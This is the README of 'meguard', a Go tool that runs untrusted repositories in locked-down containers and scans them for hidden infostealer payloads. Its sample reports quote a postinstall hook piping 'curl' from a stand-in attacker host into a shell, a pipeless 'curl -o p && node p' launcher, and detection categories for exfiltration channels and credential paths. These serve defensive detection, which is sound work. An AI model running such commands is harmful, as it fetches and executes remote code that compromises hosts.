# meguard

Run untrusted repositories inside a locked-down container sandbox, and
statically scan them for hidden malicious code.

meguard is a small, fast Go CLI for repos you do not trust, such as
fake-interview repos that hide infostealer or RAT payloads in `postinstall`
hooks, obfuscated blobs, or app source that only fires when the app builds or
starts. It clones or copies the repo into a hardened container, installs it
there, and then runs it there, so a build-time or startup payload also executes
where it can be observed. Repo code never touches your host.

Two commands:

- `meguard run <repo>` - sandbox the repo (install + run) and scan it. Scan
  findings are advisory; containment is the safety net.
- `meguard scan <repo>` - run the same static scan alone, with no container and
  no Docker dependency.

> [!WARNING]
> **Scan a repo before you open it in an editor.** A repo can carry an
> auto-run editor config (a VS Code `.vscode/tasks.json` pinned to
> `folderOpen`, a dev-container lifecycle command, a committed git hook) that
> executes a command *on your host, outside any sandbox, the instant you open
> the folder* - this is how recent "fake interview" infostealers land. meguard
> only clones and reads the repo; it never opens it in your editor, so it can
> flag these launchers *before* they fire. But it can only do that if you run
> `meguard scan <repo>` (or `meguard run <repo>`) **first**. Do not open an
> untrusted repo in VS Code (or any editor/IDE, or `code .`) until meguard has
> cleared it. If you already opened it, treat the host as potentially
> compromised - meguard cannot undo a payload that already ran.

## Safety model

meguard guarantees five invariants:

1. **No host execution.** meguard only `git clone`s (cloning runs no install
   hooks); everything else runs inside the container.
2. **No host mounts.** The repo is copied into a container tmpfs (streamed in as
   a tar through `docker exec`, since Docker refuses `docker cp` into a
   read-only container). The container has no route to host secrets.
3. **Safe by default.** Configuration only ever relaxes defaults. The zero-value
   Profile is the safest one, so a forgotten field cannot open a hole.
4. **Egress always denied.** By default meguard runs *inspected* (egress dropped
   **and** logged, so you see what a repo tried to reach); `--strict` uses
   `--network none` (no network stack at all). Neither permits egress.
5. **Always cleaned up.** The container is force-removed (`docker rm -f`) on
   success, failure, panic, or Ctrl-C.

Each container also runs non-root with all capabilities dropped,
`no-new-privileges`, a read-only root filesystem, tmpfs-only writable paths, a
PID cap, and memory/CPU ceilings.

## Install

meguard needs a **Docker-compatible runtime** on PATH. You do **not** need
Docker Desktop. Any of these work as-is:

- Docker Engine / Docker Desktop
- OrbStack (macOS, lightweight)
- Colima (macOS/Linux, lightweight)
- Podman (daemonless, rootless) - best for genuinely hostile code

Homebrew. meguard is not in homebrew-core, so tap the third-party repo and trust
it before installing:

    brew tap IsraelGboluwaga/tap
    brew trust --cask israelgboluwaga/tap/meguard
    brew install meguard

Or with Go:

    go install github.com/IsraelGboluwaga/meguard@latest

Or build from source. Two variants ship under the same binary name and commands
(see [Static scan](#static-scan-meguard-scan) for what differs):

    CGO_ENABLED=0 go build -o meguard .            # pure static (run binary is cgo-free)
    CGO_ENABLED=1 go build -tags cgo -o meguard .  # full cgo variant

Check the version with `meguard --version`. See
[docs/launch.md](docs/launch.md) for the release pipeline and verification.

## Usage

    meguard run <repo> [flags]
    meguard scan <repo> [-v|--verbose]

Both accept a git URL (cloned to a temp dir, always cleaned up) or a local path
(copied, never bind mounted).

`run` flags:

| Flag | Effect |
| --- | --- |
| `--image IMAGE` | Container image (default auto-detected, e.g. `node:22-slim`). |
| `--cmd "CMD"` | Install command (default auto-detected, e.g. `npm install`). Also disables prefetch. |
| `--runtime CLI` | Docker-compatible CLI to use (default `docker`). |
| `--strict` | No network stack at all; no egress logs (strongest, fully verified). |
| `--no-scan` | Skip the static scan. |
| `--fail-on-scan` | Exit non-zero after the run if scan found any High/Critical. |
| `--no-prefetch` | Skip the node two-phase prefetch (single-phase install). |
| `--timeout DUR` | Bound the prefetch and install (default `2m`; `0` disables). |
| `--no-exec` | Install only; skip the runtime execution phase. |
| `--exec-cmd "CMD"` | Run this exact command instead of the auto-detected plan. |
| `--exec-window DUR` | Observation window for a long-running serve step (default `3s`). |
| `-v`, `--verbose` | Full report (rationale, every finding, streamed logs). |

By default, `run`:

1. **Scans** the repo on the host first (read-only), and folds findings into the
   report. Advisory by default; the sandboxed run proceeds regardless. See
   [Static scan](#static-scan-meguard-scan).
2. **Installs** it in the sandbox. For node, this is a two-phase offline install
   so dependency lifecycle scripts run and their egress is observed. See
   [Two-phase install](#two-phase-install-node-and-install-timeout).
3. **Runs** it (only if install succeeded), to fire build-time or startup
   payloads where egress is observed. See
   [Runtime execution](#runtime-execution-phase).

Examples:

    meguard run https://github.com/some/suspicious-repo.git   # node auto-detected
    meguard run ./py-repo                                      # python auto-detected
    meguard run ./suspicious-repo --runtime podman            # rootless (best for hostile code)
    meguard run ./suspicious-repo --strict                    # strongest containment, no egress logs
    meguard run ./suspicious-repo --no-exec                   # install only
    meguard run ./suspicious-repo --exec-cmd "npm run dev"    # explicit run command
    meguard run ./suspicious-repo -v                          # full detail

    # Override auto-detection with a specific image and command:
    meguard run ./py-repo --image python:3.12-slim --cmd "pip install -r requirements.txt"

### The report

By default `run` prints a compact report: a per-stage status checklist
(✓/!/✗), a "Top findings" block with each High/Critical finding (capped at 8,
the rest rolled into one line), and a one-line `RESULT`. The raw install log is
shown only if the install failed. A spinner animates on stderr during slow
stages and disappears when output is piped.

    meguard run <repo>

    ✓ sandbox    node:22-slim, network denied (--strict, no logs), ephemeral
    ✓ prefetch   dependencies fetched in a no-host-mount container (no scripts run); deps install in-box
    ✓ install    npm install --offline --no-audit --no-fund --cache /repo/.meguard-cache (exit 0)
    ✓ exec       ran build (exit 0), start (observed then stopped)
    ! scan       8 finding(s) (2 high, 6 medium) across 8 files
    ✓ egress     denied (--network none, no logs)
    ✓ secrets    0 exposed (by construction: no host mounts, scratch HOME)

    Top findings:
      HIGH     package.json      "postinstall" runs a download piped directly into a shell: curl -sSL https://evil.example/i.sh | sh
      HIGH     package.json:1    matches download piped directly into a shell interpreter
      ... 6 more (5 entropy, 1 regex, mostly src/components/ui/*). see `meguard run -v`

    RESULT: clean install, 0 secrets exposed, no egress reached the network. Review the 2 high finding(s) above before trusting this repo.

`-v`/`--verbose` restores the full report: the active-protections rationale,
every finding with its snippet, and the streamed prefetch and sandbox logs.
Detection and containment are identical between the two modes; only the output
differs.

### Ecosystem auto-detection

When `--image` and `--cmd` are unset, meguard picks them by reading which
manifest files exist (it never runs repo code). Only **node** and **python** are
detected; anything else falls back to the node defaults, so pass an explicit
`--image` and `--cmd`.

| Detected | Markers (any) | Image | Install command |
| --- | --- | --- | --- |
| node | `package.json`, `package-lock.json`, `npm-shrinkwrap.json`, `yarn.lock`, `pnpm-lock.yaml` | `node:22-slim` | `npm install --no-audit --no-fund --fetch-retries=0` |
| python | `requirements.txt` | `python:3.12-slim` | `pip install --user --retries 0 --timeout 5 -r requirements.txt` |
| python | `pyproject.toml`, `setup.py`, `setup.cfg`, `Pipfile` | `python:3.12-slim` | `pip install --user --retries 0 --timeout 5 .` |
| python | any top-level `*.py` (no manifest) | `python:3.12-slim` | `python --version` (no-op) |

Node wins for a polyglot repo; within python, a manifest wins over a loose
`.py`. The last row is a fallback for a bare `.py` script (nothing to install,
so the command is a no-op) - run it with an explicit `--cmd "python foo.py"`.
The `--fetch-retries=0` / `--retries 0 --timeout 5` flags make the always-denied
network fail in seconds instead of retrying for minutes. For node this table is
only the *fallback*; the default is the two-phase offline install below.
`--memory`/`--cpus` are conservative internal defaults (2g / 2 CPUs) that will
become configurable.

### Two-phase install (node) and install timeout

A network-less sandbox makes `npm install` fail, and because it never completes,
dependency lifecycle scripts never run and their egress is never observed. For
node, meguard fixes this with a two-phase install (on by default):

1. **Prefetch**: `npm install --ignore-scripts` runs in a separate throwaway
   container that *does* have a network. This is safe because `--ignore-scripts`
   means no repo or dependency code runs - npm only downloads inert tarballs
   into a cache. Like every meguard container it has no host mounts, so a
   hostile local dependency spec (`file:`, a path, a workspace glob) can only
   resolve inside that container, never on your host. Only the populated cache
   (and any generated lockfile) is copied back out; `node_modules` is not.
2. **Install**: installs strictly offline from that cache with the network fully
   sealed. Because the dependency tree is already on disk, every lifecycle
   script - the repo's and every transitive dependency's - runs in the sealed
   box, where outbound attempts are logged and dropped. This is what catches a
   transitive dependency phoning a non-registry host.

`--no-prefetch` (or an explicit `--cmd`) restores the single-phase install (the
sandbox has no network, so only the repo's own root scripts run). Prefetch is
best-effort: any failure falls back to single-phase automatically, with a
warning. `--timeout` (default `2m`, `0` disables) bounds both the prefetch and
the install; on timeout the run reports an install-timeout error and cleanup
still runs. A local path is staged into a temp copy first, so meguard never
writes into your working tree.

**Python is single-phase by design**: there is no fetch step that provably runs
no code (`pip download`/`pip wheel` execute a source distribution's `setup.py`).
Python still gets the fast-fail and timeout fixes. A contained Python prefetch is
future work (see docs/decisions.md).

### Runtime execution phase

Install-only misses payloads hidden in app source (a component file, a
`tailwind.config.ts`) that only fire when the app builds or starts. So after a
successful install (exit 0), `run` executes the repo inside the same sealed
container, where the egress monitor can observe and drop its outbound attempts.
If the install fails, this phase is skipped.

The plan is auto-detected build-then-serve (reading `package.json` as data and
file existence only, no host execution):

- **Node**: `npm run build` (if a `build` script exists), then the first of
  `npm start`, `npm run dev`, `npm run serve`, `node <main>`, or `node index.js`.
- **Python**: `main.py`, then `app.py`, then a single loose top-level `*.py`.
- An unknown ecosystem or no recognized entry gets no runtime phase.

A long-running server never exits, so the serve step runs under a short
observation window (`--exec-window`, default `3s`) and is then stopped - a
startup payload has already fired by then, and being stopped by the window
counts as success. A build step (which exits) is bounded by `--timeout`.
`--no-exec` skips this phase; `--exec-cmd` overrides the plan.

All five invariants still hold: runtime code runs only inside the sealed
container, egress stays denied and logged, and the container (plus any lingering
server) is force-removed on exit. This is dynamic analysis that complements the
static scan; it is partial by nature, observing only what fires during the
build and window. Egress is collected once after all steps, so the report covers
install + build + run together.

### Egress logging (default) and `--strict`

By **default**, `run` shows what a repo tried to reach: a hardened monitor
sidecar seals a network namespace fail-closed (OUTPUT defaults to DROP for IPv4
and IPv6), the sandbox joins it, and every outbound attempt (to any IP:port, so
hardcoded C2 addresses are caught) plus every DNS lookup is logged and dropped.
Egress is still fully denied; you just get to see it:

    egress: 2 outbound attempt(s) BLOCKED (logged and dropped; none reached the network):
      - BLOCKED tcp 185.220.101.5:443
      - BLOCKED dns api.evil-c2.net

A clean run states "0 outbound attempts observed" explicitly. The monitor image
defaults to `nicolaka/netshoot` (override with `--monitor-image`; it must
provide `ip`, `iptables`, `ip6tables`, and a `tcpdump` with NFLOG support). The
sandbox gains no privileges - only the monitor (which runs no repo code) gets
the two network capabilities it needs, and `cap-drop ALL` means the sandbox
cannot alter the seal.

**`--strict`** is the strongest, fully-verified mode: `--network none`, no
network stack, no monitor, no logs. Use it for the hardest containment, or where
the monitor image / NFLOG is unavailable.

Inspected mode is verified on Docker/OrbStack (a real Linux kernel); rootless
runtimes and other kernels are not yet checked. **If the monitor cannot start,
meguard falls back to `--network none`** with a warning - egress stays fully
denied, you just lose the logs for that run.

### Choosing a runtime (the trust boundary)

The container daemon is the trust boundary: meguard's hardening is only as strong
as the runtime enforcing it, and the shared host kernel is the ceiling.
`--runtime` selects any Docker-compatible CLI (default `docker`). For genuinely
hostile code, prefer a rootless runtime like `--runtime podman`, so a container
escape lands as an unprivileged user rather than host root. meguard does not
defend against a host-kernel or root-daemon escape; a rootless runtime is the
biggest blast-radius reduction available today.

## Troubleshooting

If no Docker-compatible runtime is running, `run` fails immediately (before
cloning anything) with `meguard: no Docker-compatible runtime is available: ...`
and lists the runtimes that satisfy the requirement. Start yours and check it
with `orbstack status`, `colima status`, `podman info`, or `docker info`, then
retry. You do not need Docker Desktop.

## Static scan (`meguard scan`)

    meguard scan <repo> [-v|--verbose]

`scan` resolves the repo the same safe way `run` does (a plain `git clone`) and
runs meguard's static analyzers against its files, entirely on the host. It never
touches Docker and never executes repo code. It is a heuristic detector, not a
prover: a clean report means nothing matched, not "definitely safe". For that
guarantee, run the repo in the sandbox with `meguard run`. `scan` exits non-zero
if any High/Critical finding is reported, so it can gate CI on its own;
`meguard run --fail-on-scan` does the same gate while also containing the repo.

Output matches `run`: compact by default (a status line plus a "Top findings"
block), full detail under `-v`.

    meguard scan (no container; read-only)

    ! scan       8 finding(s) (2 high, 6 medium) across 8 files

    Top findings:
      HIGH     package.json      "postinstall" runs a download piped directly into a shell: curl -sSL https://evil.example/i.sh | sh
      HIGH     package.json:1    matches download piped directly into a shell interpreter
      ... 6 more (5 entropy, 1 regex, mostly src/components/ui/*). see `meguard scan -v`

**What scan looks for** (analyzers behind a single `Analyzer` interface):

- **manifest**: `package.json` lifecycle scripts (`preinstall`, `install`,
  `postinstall`, `prepare`, `preprepare`) scanned with the source-file pattern
  set; Python manifests (`setup.py`, `pyproject.toml`, `setup.cfg`, `Pipfile`)
  flagged at Info, since arbitrary code can run at install time regardless.
- **entropy**: per-line length plus Shannon entropy on lines over 300
  characters, catching an obfuscated payload appended after legitimate code on
  one physical line. Minified bundles (`dist/`, `build/`, `*.min.js`,
  `*.bundle.js`) are excluded, and so is a `.svg` with no `<script>` tag (its
  coordinate data is legitimately one long line). This exclusion is
  entropy-only: SVG can execute, so the regex analyzer still scans all `.svg`
  content at full severity.
- **regex**: pattern matching for obfuscation (packer signatures,
  `Function`-constructor eval, global-stashed `require`, the `_0xNNNN`
  fingerprint), download-and-execute (curl/wget piped to a shell, Python shell
  exec, Windows LOLBins), exfiltration channels (Discord webhooks, Telegram bot
  API, raw-paste hosts), credential/wallet paths, persistence, recon, and bulk
  `process.env` dumps, plus co-occurrence checks for plain-text exfiltration.
- **autorun**: editor and dev-environment configs that execute a command
  *automatically*, before you ask - a VS Code `.vscode/tasks.json` pinned to
  `runOn: folderOpen` (High), a dev-container lifecycle command
  (`postCreateCommand` and friends), or a committed git hook (`.husky/`,
  `.githooks/`). This keys on the *placement* (a config that runs on open/
  create), so it catches a pipeless launcher like
  `curl -o p && node p` that the regex analyzer's `curl | sh` pattern would
  miss. These fire on your host outside any sandbox, so this is the signal the
  "scan before you open" warning above depends on.

**False-positive controls**: severity is capped by whether a file can execute
(prose like `.md`/`.txt` is capped at Info); a correlation pass escalates two or
more weak-signal categories in one file into a stronger finding; and dedupe
collapses repeats of a finding into one entry with a count.

**Build variants**: both the pure static (`CGO_ENABLED=0`) and full cgo builds
run manifest, entropy, and regex analysis. Neither has a working AST
(tree-sitter) analyzer yet - it is a labeled no-op in both builds ("AST
analysis: disabled (...)"), so its absence is stated, never presented as "AST
found nothing". Wiring a real grammar is future work.

## Contributing

See [CLAUDE.md](CLAUDE.md) for the working contract, coding standards, and the
rule that docs and CHANGELOG are updated in the same change as code.

CI (`.github/workflows/ci.yml`) runs `gofmt -l`, `go build`, `go vet`,
`go test ./...`, and a cgo-free check on the pure static build for every push
and PR against `main`. Releases (`.github/workflows/release.yml`) run
separately, triggered by pushing a `v*` tag.

## License

meguard is licensed under the [Apache License 2.0](LICENSE) - a permissive
open-source license with an explicit patent grant. See the [LICENSE](LICENSE)
file for the full text.

## More docs

- [docs/documentation.md](docs/documentation.md) - architecture and threat model
- [docs/launch.md](docs/launch.md) - build variants, release, and deploy
- [docs/decisions.md](docs/decisions.md) - decision log
- [CHANGELOG.md](CHANGELOG.md) - changes
